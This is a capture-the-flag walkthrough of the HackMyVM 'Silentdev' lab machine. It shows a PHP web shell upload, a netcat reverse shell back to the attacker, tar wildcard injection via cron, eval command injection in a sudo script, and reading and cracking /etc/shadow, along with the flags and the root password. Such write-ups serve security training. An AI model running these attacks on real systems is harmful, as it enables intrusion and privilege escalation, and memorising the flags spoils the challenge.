# Silentdev

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.58:22
Open 10.0.2.58:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.58

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 4a:f7:09:40:45:df:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNSC2AmP7sOytRDj8hA+OAbTsfeWiAJgk1bL5swO/krJV4odqyIM+jyERdU6eRJkbgjquWaQCkdIXt0K5b0Z6Sc=
|   256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL9+HOVHg0xMjiC+vp+pbVc4HbQdBdAHpDst7fj6+Jvb
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: Upload Image
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/silentdev/writeup.png)

```bash
└─$ feroxbuster -u http://silentdev.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 278
200      GET        1l        5w       29c http://silentdev.hmv/upload.php
301      GET        9l       28w      316c http://silentdev.hmv/uploads => http://silentdev.hmv/uploads/
200      GET       70l      139w     1602c http://silentdev.hmv/
200      GET       70l      139w     1602c http://silentdev.hmv/index.html
```

The WAF was very easy to bypass, just add [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) and that's it.

![writeup-1.png](/assets/pentest/hackmyvm/silentdev/writeup-1.png)

```bash
└─$ echo '%GIF89;<?=`$_REQUEST[0]`?>' | curl http://silentdev.hmv/upload.php \
    -F 'fileToUpload=@-;filename=shell.php;type=image/gif' \
    -F 'submit=Upload Image'
File uploaded: uploads/shell.php 

└─$ curl 'http://silentdev.hmv/uploads/shell.php' --data-urlencode '0=id'
%GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)
```

## Reverse Shell

```bash
└─$ curl 'http://silentdev.hmv/uploads/shell.php' --data-urlencode '0=nc 10.0.2.15 4444 -e /bin/bash'
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.58] 41352
script /dev/null -qc/bin/bash # Get TTY
www-data@silentdev:/var/www/html/uploads$ ^Z # Background
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg; # ENTER; ENTER
[1]  + continued  nc -lvnp 4444

$ stty rows 47 cols 211;export TERM=xterm # Better UX
www-data@silentdev:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)
```

We can read developer files
```bash
www-data@silentdev:/opt/project$ find /home -type f -ls
find: '/home/alfonso': Permission denied
   129676      4 -rw-r--r--   1 developer developer     3526 Mar 29  2024 /home/developer/.bashrc
   129680      4 -rw-r--r--   1 developer developer      807 Mar 29  2024 /home/developer/.profile
   129681      4 -rw-r--r--   1 developer developer      220 Mar 29  2024 /home/developer/.bash_logout

www-data@silentdev:/opt/project$ find / -user developer 2>/dev/null
/opt/project
/home/developer
/home/developer/.bashrc
/home/developer/.profile
/home/developer/.bash_logout
/var/backups/project.tgz
```

Hmmm... not exactly a backup~
```
www-data@silentdev:/tmp$ mktemp -d
/tmp/tmp.PNxsqpSM4l
www-data@silentdev:/tmp$ tar -xzf /var/backups/project.tgz -C /tmp/tmp.PNxsqpSM4l
www-data@silentdev:/tmp$ md5sum /tmp/tmp.PNxsqpSM4l/index.html /opt/project/index.html
994f9caf1819c4964d7fff16a315e973  /tmp/tmp.PNxsqpSM4l/index.html
994f9caf1819c4964d7fff16a315e973  /opt/project/index.html
```

The backup gets updated every minute
```bash
www-data@silentdev:/var/backups$ ls -alh /var/backups/project.tgz
-rw-r--r-- 1 developer developer 1.1K Sep 12 12:14 /var/backups/project.tgz
www-data@silentdev:/var/backups$ ls -alh /var/backups/project.tgz
-rw-r--r-- 1 developer developer 1.1K Sep 12 12:15 /var/backups/project.tgz
```

pspy shows following output:
```bash
2025/09/12 12:16:58 CMD: UID=0     PID=1      | /sbin/init
2025/09/12 12:17:01 CMD: UID=0     PID=1096   | /usr/sbin/CRON -f
2025/09/12 12:17:01 CMD: UID=0     PID=1095   | /usr/sbin/cron -f
2025/09/12 12:17:01 CMD: UID=0     PID=1097   | /usr/sbin/CRON -f
2025/09/12 12:17:01 CMD: UID=0     PID=1098   | /usr/sbin/CRON -f
2025/09/12 12:17:01 CMD: UID=0     PID=1099   | /bin/sh -c cd / && run-parts --report /etc/cron.hourly
2025/09/12 12:17:01 CMD: UID=1002  PID=1100   | /bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *
2025/09/12 12:17:01 CMD: UID=1002  PID=1101   | tar -zcf /var/backups/project.tgz index.html
2025/09/12 12:17:01 CMD: UID=1002  PID=1102   | /bin/sh -c gzip
```

Because cronjob is using `*` it can mean anything, files or even command line arguments!
- [https://gtfobins.github.io/gtfobins/tar/#shell](https://gtfobins.github.io/gtfobins/tar/#shell)

```bash
└─$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtecARx5h5wY4a9Zw+WRDuE5S1mSvu+A2T36101pWuV woyag@kraken
---
www-data@silentdev:/opt/project$ echo $'#!/bin/bash\nmkdir ~/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtecARx5h5wY4a9Zw+WRDuE5S1mSvu+A2T36101pWuV woyag@kraken" > ~/.ssh/authorized_keys' | tee /opt/project/letmein.sh
#!/bin/bash
mkdir ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtecARx5h5wY4a9Zw+WRDuE5S1mSvu+A2T36101pWuV woyag@kraken" > ~/.ssh/authorized_keys

www-data@silentdev:/opt/project$ chmod +x /opt/project/letmein.sh

www-data@silentdev:/opt/project$ touch -- '--checkpoint=1'
www-data@silentdev:/opt/project$ touch -- '--checkpoint-action=exec=sh letmein.sh'

www-data@silentdev:/opt/project$ ls -alh
total 16K
-rw-r--r-- 1 www-data  www-data      0 Sep 12 12:44 '--checkpoint-action=exec=sh letmein.sh'
-rw-r--r-- 1 www-data  www-data      0 Sep 12 12:35 '--checkpoint=1'
drwxrwx--- 2 developer developers 4.0K Sep 12 12:44  .
drwxr-xr-x 3 root      root       4.0K Apr 19 11:08  ..
-rw-r--r-- 1 root      root       2.0K Apr 19 19:29  index.html
-rwxr-xr-x 1 www-data  www-data    151 Sep 12 12:38  letmein.sh

2025/09/12 12:46:01 CMD: UID=0     PID=1449   | /usr/sbin/CRON -f
2025/09/12 12:46:01 CMD: UID=1002  PID=1450   | /bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *
2025/09/12 12:46:01 CMD: UID=1002  PID=1451   | tar -zcf /var/backups/project.tgz --checkpoint-action=exec=sh letmein.sh --checkpoint=1 index.html letmein.sh
2025/09/12 12:46:01 CMD: UID=1002  PID=1452   | tar -zcf /var/backups/project.tgz --checkpoint-action=exec=sh letmein.sh --checkpoint=1 index.html letmein.sh
2025/09/12 12:46:01 CMD: UID=1002  PID=1453   | /bin/sh -c gzip
2025/09/12 12:46:01 CMD: UID=1002  PID=1454   | /bin/sh -c sh letmein.sh
2025/09/12 12:46:01 CMD: UID=1002  PID=1455   | sh letmein.sh
```

## SSH (developer)

```bash
└─$ ssh -i id_rsa developer@silentdev.hmv -t bash
developer@silentdev:~$ id
uid=1002(developer) gid=1003(developer) groups=1003(developer),1004(developers)

developer@silentdev:~$ find / -group developers -ls 2>/dev/null
   129880      4 drwxrwx---   2 developer developers     4096 Sep 12 12:44 /opt/project
      191      4 drwxrwx---   2 root      developers     4096 Aug 29 12:57 /var/backups
```

```bash
developer@silentdev:~$ sudo -l
Matching Defaults entries for developer on silentdev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on silentdev:
    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh
```

```bash
developer@silentdev:~$ cat /usr/bin/sysinfo.sh
#!/bin/bash

echo "Hello $USER, checking system status."

echo "Choose an option:"
echo "1. Disk usage (df)"
echo "2. Running processes (ps)"
echo "3. Exit"

read -p "Enter option (1-3): " opt

case "$opt" in
        1) action="df" ;;
        2) action="ps" ;;
        3) echo "Goodbye!"; exit ;;
        *) action="echo Invalid option" ;;
esac

read -p "Any additional options?: " extra

eval "$action $extra"
```

## Privilege Escalation (alfonso)

`eval` makes it possible to inject commands
```bash
developer@silentdev:~$ echo $'1\n;id' | sudo -u alfonso /usr/bin/sysinfo.sh
...
uid=1000(alfonso) gid=1000(alfonso) groups=1000(alfonso),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

```bash
developer@silentdev:~$ echo $'1\n;mkdir ~/.ssh;echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtecARx5h5wY4a9Zw+WRDuE5S1mSvu+A2T36101pWuV woyag@kraken" > ~/.ssh/authorized_keys' | sudo -u alfonso /usr/bin/sysinfo.sh
```

```bash
└─$ ssh -i id_rsa alfonso@silentdev.hmv -t bash
alfonso@silentdev:~$ id
uid=1000(alfonso) gid=1000(alfonso) groups=1000(alfonso),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
alfonso@silentdev:~$ cat user.txt
flag{A89aHFj3830878y3hFJ3h2oH}
```

## Privilege Escalation (root)

```bash
alfonso@silentdev:~$ sudo -l
Matching Defaults entries for alfonso on silentdev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User alfonso may run the following commands on silentdev:
    (ALL) NOPASSWD: /usr/bin/silentgets
```

```bash
alfonso@silentdev:~$ file /usr/bin/silentgets
/usr/bin/silentgets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=faab9c84241c2cd5503077cc1bda8f05e0c81930, for GNU/Linux 3.2.0, with debug_info, not stripped

alfonso@silentdev:~$ sudo /usr/bin/silentgets
Enter the username: FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUCK
Segmentation fault
```

:sigh: not pwn please...

Actually it's just grep! :phew:
```bash
alfonso@silentdev:~$ sudo /usr/bin/silentgets
Enter the username: letmein please
grep: please: No such file or directory
alfonso@silentdev:~$ sudo /usr/bin/silentgets
Enter the username: root /etc/passwd
/etc/passwd:root:x:0:0:root:/root:/bin/bash
/etc/passwd:root:x:0:0:root:/root:/bin/bash
alfonso@silentdev:~$ sudo /usr/bin/silentgets
Enter the username: root /etc/shadow
/etc/shadow:root:$6$jkdC2dNIGxE.kgff$4tEH1NO.QaQThFPZ2SkRnfjR9eBsYjtHSfpUedWSnRdex.tRGLQA6XCtvtw2BSufsajDhW/Qyr5JHuAxFX7lv.:20197:0:99999:7:::
/etc/passwd:root:x:0:0:root:/root:/bin/bash
```

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
mnbvcxz          (root)
```

> **Creds**: `root:mnbvcxz`

```bash
alfonso@silentdev:~$ su - root
Password:
root@silentdev:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@silentdev:~# cat /root/root.txt
flag{p7609TNt6a0bGF8HW78BG7eh}
```